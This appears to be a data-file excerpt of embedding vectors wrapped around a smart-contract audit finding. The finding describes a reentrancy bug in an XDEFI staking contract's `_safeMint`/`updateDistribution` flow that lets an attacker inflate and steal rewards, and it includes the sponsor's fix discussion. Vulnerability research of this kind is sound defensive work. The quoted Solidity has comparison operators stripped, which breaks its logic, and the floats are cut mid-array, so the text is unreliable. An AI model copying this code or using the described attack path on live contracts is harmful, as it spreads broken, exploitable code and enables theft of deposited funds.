-0.011660179123282433, 0.016520962119102478, -0.0004213985812384635, -0.008274735882878304, -0.011232543736696243, -0.021424509584903717, -0.0005830980371683836, 0.001618776354007423, 0.020398186519742012, -0.029449792578816414, 0.03977004811167717, -0.015922274440526962, 0.005470163654536009, -0.008452917449176311, -0.017219433560967445, -0.02173810824751854, -0.022422324866056442, -0.0025658095255494118, -0.01214483194053173, -0.02796732448041439, -0.01459660567343235, 0.01910102739930153, 0.0020348294638097286, 0.020412441343069077, 0.007426593452692032, 0.006867104209959507, 0.006920558400452137, -0.010591091588139534, -0.02480282634496689, -0.012736393138766289, -0.037546347826719284, 0.004037586506456137, -0.005808707792311907, -0.005883543752133846, -0.0035760970786213875, -0.02845197729766369, -0.03694765642285347, -0.014938713051378727, -0.00739808427169919, -0.014368533156812191, -0.010541200637817383, 0.04062531888484955, 0.0012650866992771626, -0.02317781373858452, -0.031131822615861893, -0.028323685750365257, 0.061921536922454834, 0.008673861622810364, -0.006842158734798431, -0.0155944200232625, 0.0048358384519815445, -0.013156901113688946, 0.023833520710468292, -0.01981375180184841, -0.02732587233185768, -0.004764565732330084, -0.01944313384592533, 0.010170583613216877, -0.014824677258729935, -0.00880215223878622, 0.0207260400056839, 0.025401514023542404, 0.02391904778778553, 0.006475105416029692, 0.016535216942429543, 0.008680989034473896, -0.03378316015005112, -0.0038950415328145027, 0.0011697596637532115, 0.009742949157953262, -0.01563718356192112, -0.013484754599630833, 0.0026174820959568024, -0.014090570621192455, 0.009293932467699051, 0.03087524138391018, -0.016763288527727127, 0.00880215223878622, -0.04091040790081024, -0.004440275952219963, -0.006606959737837315, -0.002271810546517372, -0.014475442469120026, -0.0024713734164834023, 0.007023903541266918, -0.0010575054911896586, 0.0065143052488565445, 0.01981375180184841, -0.016506707295775414, -0.004857220221310854, -0.04587097465991974, 0.014019298367202282, 0.023206321522593498, -0.013014356605708599, -0.03418228402733803, -0.014019298367202282, -0.007259103003889322, 0.009080114774405956, -0.013349336571991444, 0.0016036309534683824, -0.037546347826719284, -0.022892722859978676, -0.021695345640182495, 0.015651438385248184, -0.010106438770890236, -0.025045152753591537, 0.014454060234129429, -0.005170818883925676, -0.013057120144367218, -0.0233061034232378, 0.007333938963711262, -0.1830277442932129, 0.03278534486889839, 0.011417852714657784, 0.002309228526428342, 0.03971302881836891, -0.0007327702478505671, -0.007590519730001688, -0.014739150181412697, -0.03566475212574005, -0.017960667610168457, 0.020868584513664246, -0.0006102706538513303, -0.0020152295473963022, -0.028081359341740608, -0.01656372658908367, 0.011517633683979511, -0.012301631271839142, -0.0014512860216200352, 0.02600020356476307, 0.021581308916211128, 0.03403973951935768, -0.020583493635058403, -0.0024446463212370872, -0.017247941344976425, 0.007405211683362722, -0.0065143052488565445, -0.002396537456661463, 0.009885493665933609, 0.001479795086197555, 0.0045935120433568954, -0.0315309502184391, -0.03446737676858902, 0.018986990675330162, -0.006154379341751337, 0.003756060032173991, 0.014653623104095459, 0.004611330106854439, -0.01174570620059967, 0.010085057467222214, 0.03289937973022461, 0.010241856798529625, 0.016264380887150764, -0.012629484757781029, 0.010006656870245934, -0.031046295538544655, 0.018801681697368622, 0.0057908897288143635, -0.014853186905384064, 0.014511078596115112, -0.027739252895116806, 0.023448647931218147, -0.026698673143982887, 0.000910060596652329, 0.01885870099067688, 0.026513366028666496, -0.01637841761112213, 0.006068852264434099, 0.02210872620344162, -0.008011027239263058, -0.016421182081103325, -0.026271039620041847, -0.026370819658041, 0.02735438011586666, -0.00864535290747881, 0.025344496592879295, -0.009072987362742424, -0.003991259261965752, 0.01643543504178524, -0.033897195011377335, -0.0031181713566184044, -0.021424509584903717, 0.007145066745579243, 0.014539587311446667, 0.011660179123282433, 0.021267710253596306, 0.039114341139793396, -0.010541200637817383, 0.010940327309072018, -0.016292890533804893, -0.02999146282672882, -0.023249085992574692, 0.026755692437291145, 0.004785947501659393, -0.0034620610531419516, -0.02738288976252079, -0.007526374887675047, -0.005063910037279129, 0.0033622796181589365, 0.021139420568943024, -0.020198622718453407, 0.0008414608309976757, -0.006571323610842228, 0.005716053303331137, 0.002314574085175991, -0.022778687998652458, 0.025501295924186707, 0.01689158007502556, -0.0005403345567174256, 0.012829047627747059, -0.02570085972547531, -0.02367672137916088, -0.0071771396324038506, -0.016335655003786087, 0.01228024996817112, 0.017946412786841393, -0.009308187291026115, -0.01987076923251152, 0.007775828242301941, 0.02051222138106823, -0.027953069657087326, -0.010947453789412975, -0.007405211683362722, 0.016520962119102478, 0.01888720877468586, 0.008210591040551662, 0.003130644094198942, 0.009956766851246357, -0.00425496743991971, 0.025529805570840836, -0.008367390371859074, 0.06739526242017746, -0.009856984950602055, -0.021011129021644592, 0.042050767689943314, 0.0001955538900801912, 0.007248411886394024, -0.09636040031909943, -0.014240243472158909, 0.00038531687459908426, 0.02594318613409996, -0.017490267753601074, 0.025501295924186707, 0.0001408745301887393, 0.03737529367208481, -0.003984131850302219, 0.029079174622893333, -0.005651908461004496, -0.014981476590037346, -0.013007229194045067, 0.022222761064767838, 0.01214483194053173, 0.0021809381432831287, 0.005616271868348122, 0.008395899087190628, 0.0101206935942173, 0.04672624170780182, 0.003125298535451293, -0.023006759583950043, 0.003315952606499195, -0.004190822131931782, -0.02783903293311596, 0.01061247382313013, -0.02232254296541214, 0.044388506561517715, -0.016079073771834373, 0.02275017835199833, 0.018174484372138977, -0.008524189703166485, 0.030305061489343643, -0.00648579653352499, -4.9027676141122356e-05, -0.02149578183889389, -0.0011118508409708738, -0.01627863571047783, 0.0023074469063431025, -0.036263443529605865, 0.020654767751693726, 0.03158796578645706, 0.015166785567998886, 0.015708455815911293, 0.014881695620715618, 0.016264380887150764, -0.009472114033997059, 0.01686307042837143, -0.005234964191913605, -0.017932157963514328, -0.03238621726632118, -0.011446361429989338, 0.0014005043776705861, 0.004365439992398024, 0.007116558030247688, -0.004393948707729578, 0.02064051292836666, 0.023690974339842796, -0.027368634939193726, -0.011004472151398659, -0.0010227601742371917, -0.0011635234113782644, -0.007333938963711262, -0.015181039460003376, 0.004112422466278076, -0.0013951589353382587, 0.0019653388299047947, -0.009087242186069489, 0.005498672369867563, -0.02514493279159069, -0.018801681697368622, 0.029791899025440216, -0.018545100465416908, 0.01625012792646885, -0.023819265887141228, 0.014560969546437263, 0.0014218861469998956, -0.013420609757304192, 0.026470601558685303, -0.0023929737508296967, -0.02535875141620636, 0.004500857554376125, -0.00739808427169919, -0.006254160776734352, 0.02600020356476307, 0.015494639053940773, 0.004939183592796326, -0.012729266658425331, 0.038373108953237534, -0.017746848985552788, -0.00379882357083261, -0.010013784281909466, 0.010256110690534115, -0.02373373880982399, -0.006040343549102545, 0.017319215461611748, -0.0080039007589221, -0.011902505531907082, -0.006157943047583103, 0.008125063963234425, -0.032614290714263916, -0.00456856656819582, -0.04780958592891693, 0.04629860818386078, 0.0010922509245574474, -0.01002803910523653, -0.021695345640182495, -0.013221046887338161, -0.004465221427381039, 0.013541772961616516, 6.720772944390774e-05, 0.0010067238472402096, -0.018017685040831566, 0.022650396451354027, 0.0013996134512126446, -0.04187971353530884, -0.004240713082253933, -0.024275409057736397, 0.02925022877752781, -0.016962852329015732, 0.0072733573615550995, 0.012486940249800682, 0.01046992838382721, -0.015708455815911293, 0.008830660954117775, 0.02376224659383297, 0.005452345125377178, -0.0006414523813873529, 0.000281971791991964, 0.015252312645316124, 0.01803193986415863, 0.013940898701548576, 0.002343083033338189, -0.028965139761567116, -0.0184880830347538, 0.027397144585847855, -0.006307614967226982, -0.016235873103141785, 0.014895949512720108, 0.01214483194053173, 0.01827426627278328, -0.029278738424181938, 0.009365204721689224, -0.02293548732995987, -0.010591091588139534, -0.003944932017475367, -0.0067922682501375675, -0.0071842665784060955, -0.012593848630785942, 0.022037453949451447, -0.0033765342086553574, 0.008174953982234001, 0.047267913818359375, 0.01082629058510065, -0.026057220995426178, -0.013156901113688946, -0.03566475212574005, -0.007868482731282711, -0.009051606059074402, 0.007932627573609352, 0.010156329721212387, -0.005976198241114616, 0.005776635371148586, -0.011510507203638554, 0.01971396990120411, -0.03523711860179901, 0.020768802613019943, -0.0202413871884346, -0.04011215642094612, 0.008488553576171398, 0.014119080267846584, -0.01806044764816761, -0.043561745434999466, 0.009856984950602055, -0.006642595864832401, -0.0116530517116189, 0.018573610112071037, -0.010861926712095737, 0.0233061034232378, -0.0035315516870468855, -0.01925782673060894, 0.007009649183601141, 0.01824575662612915, -0.01238715834915638, -0.013962280005216599, 0.012116323225200176, 0.010975963436067104, -0.006624777801334858, -0.014468315057456493, 0.015280821360647678, -0.022864213213324547, 0.027653725817799568, -0.04302007332444191, 0.01928633451461792, 0.00017194487736560404, 0.018587864935398102, 0.007847100496292114, 0.023348867893218994, -0.009015969932079315, 0.007333938963711262, 0.019913533702492714, -0.009557640179991722, 0.0028330814093351364, 0.01234439481049776, 0.010085057467222214, -0.011774214915931225, 0.006945503875613213, -0.00873800739645958, -0.03977004811167717, -0.031816039234399796, 0.02639932930469513, 0.010605346411466599, 0.011980905197560787, -0.005630526691675186, -0.0014379224739968777, 0.02333461306989193, -0.006521432660520077, 0.014938713051378727, 0.04341920092701912, 0.008303244598209858, 0.009222660213708878, 0.03175901994109154, 0.0009639604249969125, -0.0008806606638245285, 0.010541200637817383, -0.020825820043683052, 0.03161647543311119, -0.021723853424191475, 0.020996874198317528, -0.015751220285892487, -0.006243470124900341, -0.004507984966039658, 0.020212877541780472, 0.004540057387202978, -0.023348867893218994, -0.01386249903589487, 0.00889480672776699, 0.007447974756360054, -0.0027208272367715836, -0.0008623970788903534, 0.0033640614710748196, 0.07446549832820892, 0.04008364677429199, -0.006090234033763409, -0.0010610691970214248, 0.003795259865000844, 0.011881123296916485, 0.0012080686865374446, -0.013648681342601776, 0.018844446167349815, -0.024788571521639824, 0.01569420099258423, 0.003586787963286042, -0.02480282634496689, -0.0014806858962401748, -0.00759764714166522, 0.008438662625849247, -0.008189208805561066, 0.019457388669252396, -0.02799583412706852, -0.026370819658041, 0.03044760599732399, 0.03603537008166313, 0.016535216942429543, 0.03361210599541664, -0.02572936750948429, -0.011424980126321316, 0.02434668131172657, 0.026299547404050827, -0.01904400810599327, -0.018872953951358795, -0.015024240128695965, 0.008502807468175888, -0.023690974339842796, -0.02783903293311596, -0.008723752573132515, -0.002385846571996808, -0.004796638619154692, -0.0057017989456653595, 0.019656952470541, -0.0077544464729726315, -0.016349907964468002, 0.029392773285508156, -0.016706271097064018, -0.0040767863392829895, 0.008524189703166485, 0.004009077325463295, -0.016820307821035385, -0.003784569213166833, -0.025672350078821182]"
"High Severity

[H-02]

 The reentrancy vulnerability in _safeMint can allow an attacker to steal all rewards

There is a reentrancy vulnerability in the _safeMint function```solidityfunction _safeMint(    address to,    uint256 tokenId,    bytes memory _data) internal virtual {    _mint(to, tokenId);    require(        _checkOnERC721Received(address(0), to, tokenId, _data),        ""ERC721: transfer to non ERC721Receiver implementer""    );}...function _checkOnERC721Received(    address from,    address to,    uint256 tokenId,    bytes memory _data) private returns (bool) {    if (to.isContract()) {        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {            return retval == IERC721Receiver.onERC721Received.selector;```The lock function changes the totalDepositedXDEFI variable after calling the _safeMint function```solidityfunction lock(uint256 amount_, uint256 duration_, address destination_) external noReenter returns (uint256 tokenId_) {    // Lock the XDEFI in the contract.    SafeERC20.safeTransferFrom(IERC20(XDEFI), msg.sender, address(this), amount_);    // Handle the lock position creation and get the tokenId of the locked position.    return _lock(amount_, duration_, destination_);}...    function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, ""INVALID_AMOUNT"");    // Get bonus multiplier and check that it is not zero (which validates the duration).    uint8 bonusMultiplier = bonusMultiplierOf[duration_];    require(bonusMultiplier != uint8(0), ""INVALID_DURATION"");    // Mint a locked staked position NFT to the destination.    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));    // Track deposits.    totalDepositedXDEFI += amount_;```Since the updateDistribution function does not use the noReenter modifier, the attacker can re-enter the updateDistribution function in the _safeMint function. Since the value of totalDepositedXDEFI is not updated at this time, the _pointsPerUnit variable will become abnormally large.```solidity    function updateDistribution() external {       uint256 totalUnitsCached = totalUnits;       require(totalUnitsCached uint256(0), ""NO_UNIT_SUPPLY"");       uint256 newXDEFI = _toUint256Safe(_updateXDEFIBalance());       if (newXDEFI == uint256(0)) return;       _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);       emit DistributionUpdated(msg.sender, newXDEFI);   }   ...   function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {       uint256 previousDistributableXDEFI = distributableXDEFI;       uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this))-totalDepositedXDEFI;       return _toInt256Safe(currentDistributableXDEFI)-_toInt256Safe(previousDistributableXDEFI);   }```If the attacker calls the lock function to get the NFT before exploiting the reentrance vulnerability, then the unlock function can be called to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function. Since the unlock function calls the _updateXDEFIBalance function, the attacker cannot steal the assets deposited by the user```solidityfunction unlock(uint256 tokenId_, address destination_) external noReenter returns (uint256 amountUnlocked_) {    // Handle the unlock and get the amount of XDEFI eligible to withdraw.    amountUnlocked_ = _unlock(msg.sender, tokenId_);    // Send the the unlocked XDEFI to the destination.    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_);    // NOTE: This needs to be done after updating `totalDepositedXDEFI` (which happens in `_unlock`) and transferring out.    _updateXDEFIBalance();}...function _unlock(address account_, uint256 tokenId_) internal returns (uint256 amountUnlocked_) {    // Check that the account is the position NFT owner.    require(ownerOf(tokenId_) == account_, ""NOT_OWNER"");    // Fetch position.    Position storage position = positionOf[tokenId_];    uint96 units = position.units;    uint88 depositedXDEFI = position.depositedXDEFI;    uint32 expiry = position.expiry;    // Check that enough time has elapsed in order to unlock.    require(expiry != uint32(0), ""NO_LOCKED_POSITION"");    require(block.timestamp = uint256(expiry), ""CANNOT_UNLOCK"");    // Get the withdrawable amount of XDEFI for the position.    amountUnlocked_ = _withdrawableGiven(units, depositedXDEFI, position.pointsCorrection);    // Track deposits.    totalDepositedXDEFI -= uint256(depositedXDEFI);    // Burn FDT Position.    totalUnits -= units;    delete positionOf[tokenId_];    emit LockPositionWithdrawn(tokenId_, account_, amountUnlocked_);}...function _withdrawableGiven(uint96 units_, uint88 depositedXDEFI_, int256 pointsCorrection_) internal view returns (uint256 withdrawableXDEFI_) {    return        (            _toUint256Safe(                _toInt256Safe(_pointsPerUnit * uint256(units_)) +                pointsCorrection_            ) / _pointsMultiplier        ) + uint256(depositedXDEFI_);}```<https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L253-L281       function updateDistribution() external  {    +    function updateDistribution() external  noReenter {[deluca-mike (XDEFI) resolved(https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1008233320): Valid and a big issue. However, due to other recommendations, I will not solve it this way. Instead, `updateDistribution()` will be called at the start of every lock/unlock function (so it can't have a `noReenter` modifier), and the `_safeMint` calls will be moved to the end of their respective operations to prevent the effect of the re-entrancy (i.e. position will created with a `_pointsPerUnit` before a re-entering from `_safeMint` can affect it). Tests will be added to show this is not longer possible.[deluca-mike (XDEFI) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1012774852): In our release candidate contract, as mentioned above, `updateDistribution()` is called before each locking and unlocking function, via a `updatePointsPerUnitAtStart` modifier(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L77-L80), and thus, `updateDistribution()` is now a public fucntion, and since it is used by other functions, cannot be behind a `noReenter`.  See: `lock`(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L177) `lockWithPermit`(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L181) `relock`(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L188) `unlock`(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L195) `relockBatch`(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L233) `unlockBatch`(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L240)  Also, a test was written(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/test/XDEFIDistributionReceivers.js) to ensure that this is no longer exploitable, and that the contract behaves properly if a re-entrancy call `updateDistribution()`.[Ivshti (Judge) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1013783009): Agreed with the severity.  Resolution of reordering the calls seems to be adequate  ","[-0.00778070418164134, -0.005619009491056204, -0.019137458875775337, -0.017461184412240982, -0.02595430612564087, 0.038498420268297195, -0.05291437730193138, 0.0026279082521796227, -0.0419347807765007, -0.007242899388074875, 0.050344087183475494, 0.020073378458619118, 0.0076340301893651485, -0.017153868451714516, 0.00741052720695734, -0.005908865015953779, 0.012655867263674736, 0.007305759936571121, 0.018411073833703995, 0.0077737197279930115, -0.008164850063621998, -0.004428156651556492, -0.022895105183124542, -0.008444229140877724, 0.015924600884318352, -0.003562081838026643, 0.043499305844306946, -0.023230360820889473, -0.002044704742729664, -0.007592123467475176, 0.021372491493821144, -0.007543231826275587, -0.02628955990076065, -0.01783834584057331, -0.012956199236214161, -0.016259856522083282, 0.003415407845750451, -0.02908335067331791, 0.005182479973882437, -0.010469726286828518, 0.032240331172943115, 0.024110404774546623, 0.002949194284155965, 0.01171296276152134, 0.012097109109163284, 0.025423485785722733, -0.003095868043601513, -0.0007661095005460083, -0.0034765219315886497, 0.014059746637940407, 0.03439154848456383, 0.011119282804429531, -0.015016619116067886, 0.024012621492147446, -0.0073616355657577515, -0.01352892629802227, 0.025968274101614952, 0.009065846912562847, 0.0029526865109801292, -0.0017531029880046844, 0.002669815206900239, 0.00548630440607667, -0.015282029286026955, 0.01733546517789364, 0.01810375601053238, 0.012055202387273312, -0.008800437673926353, 0.0038624140433967113, -0.034978244453668594, -0.01124500297009945, 0.03595607355237007, 0.011349770240485668, 0.0011375962058082223, 0.01248823944479227, 0.005912357475608587, 0.005818067118525505, 0.007235914934426546, -0.003740185871720314, 0.034000419080257416, -0.01701417937874794, 0.020380694419145584, 0.02239222452044487, -0.0032146042212843895, 0.041348084807395935, -0.005622501485049725, -0.0050462824292480946, -0.0006552309496328235, 0.019780030474066734, 0.008011192083358765, -0.013647662475705147, 0.016804644837975502, -0.00145102443639189, 0.018466949462890625, -0.00778070418164134, -0.03238002210855484, 0.0034730297047644854, -0.017433246597647667, 0.00803912989795208, -0.0153658427298069, 0.0030103083699941635, -0.010623385198414326, 0.015407749451696873, -0.020115286111831665, -0.016748769208788872, -0.024347877129912376, -0.02106517367064953, -0.013766398653388023, -0.005381537135690451, 0.011349770240485668, -0.0010581478709354997, -0.016874488443136215, 0.026191778481006622, -0.01012748759239912, -0.015980476513504982, -0.00227170018479228, 0.026149870827794075, 0.05121016502380371, -0.0037855850532650948, -0.012104093097150326, -0.03944830968976021, 0.016092227771878242, 0.007613076828420162, -0.01206917129456997, -0.020841671153903008, 0.01849488727748394, -0.022252533584833145, -0.005168510600924492, -0.01116817444562912, -0.028608405962586403, -0.017978036776185036, 0.02782614529132843, 0.019333023577928543, 0.042661167681217194, 0.000762617273721844, 0.0006997570162639022, 0.008395337499678135, -0.018913956359028816, -0.014415954239666462, -0.007148609030991793, -0.03631926327943802, 0.017265619710087776, 0.018913956359028816, 0.002390436362475157, 0.01442992314696312, 0.0027029914781451225, 0.009345225989818573, -0.009938906878232956, 0.010078595951199532, 0.007200992666184902, -0.0025231412146240473, -0.017405308783054352, -0.0007211469346657395, -0.009806201793253422, -0.004421172197908163, -0.023509738966822624, 0.005405982956290245, -0.010721167549490929, -0.008108974434435368, -0.022364286705851555, -0.022196657955646515, -0.011545335873961449, 0.0041976687498390675, -0.00266283075325191, -0.002818235196173191, 0.018201539292931557, 0.035369377583265305, 0.0038205073215067387, 0.0186066385358572, 0.005098666064441204, 0.019933689385652542, 0.004124331753700972, 0.010050658136606216, -0.005273277871310711, 0.013158748857676983, -0.0007403542404063046, 0.031905077397823334, 0.013899103738367558, -0.0016203980194404721, -0.006970505230128765, -0.0028706188313663006, -0.001022352371364832, -0.007585139013826847, 0.04366693273186684, 0.04472857341170311, -0.022210627794265747, 0.017461184412240982, 0.02711372822523117, 0.030368493869900703, -0.0012126793153584003, 0.0010904510272666812, 0.022755416110157967, 0.03346959874033928, -0.03763234615325928, -0.015351873822510242, -0.6025645732879639, -0.02119089476764202, -0.016162073239684105, 0.006177767179906368, -0.006946059409528971, 0.018187571316957474, 0.006635250523686409, 0.02874809503555298, -0.004644675180315971, 0.0354531891644001, 0.00021422692225314677, 0.0009455231484025717, 0.00831152405589819, -0.029223039746284485, -0.010064627043902874, -0.00998779758810997, 0.003397946711629629, -0.011782807298004627, 0.024655193090438843, 0.01926317997276783, -0.019067613407969475, 0.0313742570579052, -0.010763074271380901, 0.009456978179514408, 0.013102873228490353, 0.0019294609082862735, -0.003404931165277958, -0.005367568228393793, -0.013954979367554188, -0.002289161318913102, -0.020729919895529747, 0.002353767864406109, -0.0013480035122483969, 0.007148609030991793, 0.04520351439714432, -0.013864181004464626, -0.011664072051644325, 0.01122405007481575, 0.000985683873295784, 0.032575588673353195, -0.000650865666102618, -0.0021424873266369104, 0.05411570519208908, -0.0034450918901711702, 0.012760634534060955, -0.006310472264885902, 0.02913922630250454, -0.004026549402624369, 0.006698110606521368, -0.040090881288051605, 0.005165018606930971, -0.001115769729949534, 0.01207615528255701, 0.04053788632154465, -0.01056052464991808, -0.006191736087203026, 0.02651306428015232, 0.0026279082521796227, 0.006387301720678806, -0.007787688635289669, 0.006390793714672327, 0.018243446946144104, -0.0342518612742424, 0.002968401415273547, -0.02880397066473961, -0.00903092510998249, -0.003949719946831465, 0.015463626012206078, 0.020869608968496323, -0.017908191308379173, 0.010504649020731449, 0.014024823904037476, 0.007850549183785915, 0.01294921524822712, 0.0360957607626915, 0.0020045440178364515, -0.002537110121920705, -0.008011192083358765, 0.003525413339957595, 0.045566707849502563, 0.007431480567902327, -0.0188860185444355, -0.018019942566752434, 0.0031377749983221292, 0.014653426595032215, 0.016399545595049858, 0.026862287893891335, -0.011789792217314243, 0.008053098805248737, -0.0019032692071050406, 0.0018997769802808762, 0.0026191778015345335, -0.00935919489711523, -0.02267160266637802, 0.016818612813949585, 0.00778070418164134, -0.01561728399246931, 0.02496251091361046, -0.006973997224122286, -0.023956745862960815, -0.02507426217198372, 0.01372449193149805, -0.011817730031907558, -0.008737577125430107, 0.03603988513350487, 0.04243766516447067, -0.0003339451795909554, 0.0028112507425248623, 0.04978533089160919, -0.03254764899611473, -0.025535237044095993, -0.004693566355854273, -0.01130087859928608, -0.001785406144335866, -0.018858080729842186, -0.03117869235575199, 0.023775149136781693, -0.006156813818961382, -0.009966844692826271, 0.0064780996181070805, 0.02585652284324169, 0.0121250469237566, 0.0159665085375309, 0.013389237225055695, 0.011307863518595695, -0.0034939830657094717, 0.02420818619430065, -0.012271720916032791, 0.01941683702170849, 0.012523162178695202, 0.01915142871439457, 0.00429195910692215, 0.0277702696621418, -0.0057656834833323956, 0.015840787440538406, -0.00035184287116862833, 0.005622501485049725, -0.008730592206120491, 0.014779146760702133, -0.03634720295667648, -0.004351327195763588, -0.009289350360631943, 0.008535027503967285, -0.02370530553162098, -0.012620944529771805, -0.028342995792627335, -0.01479311566799879, -0.008695670403540134, -0.0010633862111717463, 0.003385723801329732, -0.030312618240714073, -0.0036982789169996977, -0.013186686672270298, 0.012711742892861366, 0.0007434099679812789, -0.0059647406451404095, 0.032799091190099716, -0.02265763469040394, 0.009722388349473476, -0.022978920489549637, 0.002867126604542136, 0.01915142871439457, -0.01750309206545353, -0.02788202092051506, -0.031150754541158676, -0.0277702696621418, 0.012732695788145065, -0.0013977679191157222, -0.008744561113417149, -0.03930861875414848, -0.0188860185444355, -0.017544999718666077, -0.029893549159169197, 0.00240091304294765, 0.0006395159289240837, 0.041012831032276154, -0.03922480717301369, 0.0007971031009219587, -0.011021500453352928, 0.02031085081398487, 0.004400218836963177, 0.01871838979423046, -0.02666672132909298, -0.0002448931336402893, 0.018746327608823776, 0.001915492000989616, 0.005926326382905245, 0.02612193301320076, 0.017531029880046844, 0.025870492681860924, -0.018522825092077255, -0.006198720540851355, 0.0002769780403468758, -0.00422560703009367, -0.013836243189871311, 0.006987966131418943, 0.0020307358354330063, -0.0019137458875775337, -0.0033071485813707113, 0.029837673529982567, 0.008695670403540134, -0.005793621297925711, 0.006561913527548313, -0.032799091190099716, 0.006893675774335861, -0.018732359632849693, -0.0146254887804389, -0.02035275660455227, 0.02485075779259205, -0.007661968003958464, -0.019891781732439995, -0.027756299823522568, -0.02029688097536564, 0.0002922565909102559, 0.0006368967005982995, 0.013563849031925201, -0.009009971283376217, 0.0016701623098924756, 0.02107914350926876, -0.014241342432796955, -0.01327748503535986, -0.01877426542341709, 0.03165363520383835, 0.015323936007916927, 0.006488576531410217, -0.004679597448557615, 0.0033281019423156977, -0.017824377864599228, -0.007333697751164436, -0.009163630194962025, 0.008339461870491505, 0.003914797678589821, 0.019626371562480927, -0.019291117787361145, 0.012467286549508572, 0.009813185781240463, 0.025311734527349472, 0.014234358444809914, 0.01363369356840849, -0.009142676368355751, 0.006038077641278505, 0.015184246934950352, 0.007696890272200108, -0.012711742892861366, 0.015449656173586845, 5.773104203399271e-05, 0.013270501047372818, 0.018313290551304817, -0.01065132301300764, 0.012998105958104134, -0.005818067118525505, 0.004679597448557615, -0.03134632110595703, -0.0016151596792042255, 0.020045440644025803, -0.02113501913845539, 0.026485126465559006, 0.012928261421620846, 0.019905751571059227, 0.010078595951199532, -0.008444229140877724, -0.000985683873295784, 0.014527706429362297, -0.019277147948741913, 0.024557411670684814, 0.001348876510746777, -0.02732326276600361, -0.0012764126295223832, 0.00905187800526619, 0.008220725692808628, 0.015840787440538406, -0.007389573380351067, -0.02980973571538925, 0.02107914350926876, 0.019053645431995392, 0.01270475797355175, 0.0040335338562726974, 0.007040349766612053, 0.0061323679983615875, -0.01259300671517849, -0.06453654170036316, -0.019346993416547775, 0.02130264602601528, 0.0274908896535635, 0.00673652533441782, -0.002102326601743698, -0.018676484003663063, -0.0018177094170823693, 0.019961627200245857, 0.01363369356840849, 0.01051163300871849, 0.003396200481802225, 0.01102848444133997, 0.0027518828865140676, -0.017964066937565804, -0.01070021465420723, 0.01651129685342312, -0.02047847770154476, -0.007906424812972546, 0.003321117488667369, 0.02166583761572838, -0.0032687338534742594, -0.016972271725535393, 0.00889123510569334, 0.03704565018415451, -0.006181259639561176, -0.007515294011682272, -0.002704737475141883, -0.009883031249046326, -0.026149870827794075, 0.0313742570579052, 0.016664955765008926, -0.02342592552304268, -0.008304540067911148, -0.006348886992782354, 0.002682038117200136, -0.009945890866219997, -0.007592123467475176, 0.0324917733669281, 0.020003532990813255, -0.00370526360347867, -0.03165363520383835, -0.015170278027653694, 0.002755375113338232, 0.033609289675951004, 0.03319022059440613, -0.012830479070544243, 0.006572389975190163, -0.012334581464529037, 0.011161189526319504, -0.012893338687717915, -0.005741237662732601, -0.004662136547267437, -0.0031604745890945196, 0.014932805672287941, -0.0171678364276886, 0.006520006339997053, 0.008590903133153915, 0.019933689385652542, -0.0011751377023756504, 0.0009315542411059141, -0.004030041396617889, 0.0003341634292155504, -0.01007161196321249, 0.011936466209590435, 0.016287794336676598, 0.025269826874136925, 0.012760634534060955, -0.009198551997542381, -0.013284469954669476, 0.03587225824594498, 0.009470947086811066, 0.00019283696019556373, -0.0071590859442949295, -0.013424159027636051, -0.011112297885119915, 0.007962300442159176, 0.005566625855863094, -0.019877813756465912, 0.014388016425073147, -0.008074051700532436, -0.005870450288057327, -0.007962300442159176, -0.022783353924751282, 0.020897546783089638, 0.017195774242281914, -0.004288467112928629, 0.005053266882896423, 0.02518601343035698, -0.0059682331047952175, -0.03291084244847298, 0.01394101046025753, -0.011286909691989422, 0.009023940190672874, 0.021470272913575172, -0.016832582652568817, -0.04542702063918114, -0.029949424788355827, 0.01883014291524887, 0.012118062935769558, 0.014059746637940407, -0.00397765776142478, -0.03106694109737873, -0.03358134999871254, -0.023914840072393417, -0.05218799039721489, 0.002399166813120246, 0.013563849031925201, -0.008870282210409641, -0.007235914934426546, -0.0366545207798481, -0.005112634971737862, -0.02272747829556465, 0.013438127934932709, -0.019877813756465912, 0.020380694419145584, -0.028384903445839882, 0.002723944839090109, 0.015547439455986023, 0.0016867504455149174, 0.018746327608823776, -0.018690451979637146, 0.00778070418164134, 0.012104093097150326, -0.011838683858513832, -0.03352547436952591, -0.021372491493821144, -0.017796440050005913, 0.010225269943475723, -0.006149829365313053, 0.029949424788355827, -0.02732326276600361, 0.0019416838185861707, 0.018676484003663063, 0.0033700086642056704, -0.0035306515637785196, 0.03140219673514366, -0.009966844692826271, 0.0020289896056056023, -0.0024620271287858486, 0.012523162178695202, 0.042772918939590454, 0.008171834982931614, -0.007445449475198984, 0.006862245965749025, -0.004550384823232889, -0.023174485191702843, 0.010015735402703285, -0.007249883841723204, -0.0017871522577479482, 